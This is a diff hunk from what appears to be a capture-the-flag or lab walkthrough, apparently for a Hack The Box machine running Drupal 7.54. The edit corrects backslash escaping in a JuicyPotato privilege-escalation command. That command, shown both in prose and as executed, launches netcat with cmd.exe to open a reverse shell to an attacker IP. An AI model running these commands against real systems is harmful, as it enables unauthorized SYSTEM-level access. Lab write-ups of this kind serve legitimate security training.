@@ -1104,7 +1104,7 @@ Next, we need a "CLSID" to use for this specific version of Windows. We can use 
 
 Start a new listener, and run the following command to get a reverse shell:
 
-> \10.10.14.10\SHARE\JuicyPotato.exe -l 2345 -p cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.10 8888" -t \* -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+> \\\10.10.14.10\SHARE\JuicyPotato.exe -l 2345 -p cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.10 8888" -t \* -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 
 ```
 C:\inetpub\drupal-7.54>\\10.10.14.10\SHARE\JuicyPotato.exe -l 2345 -p cmd.exe -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.10 8888" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
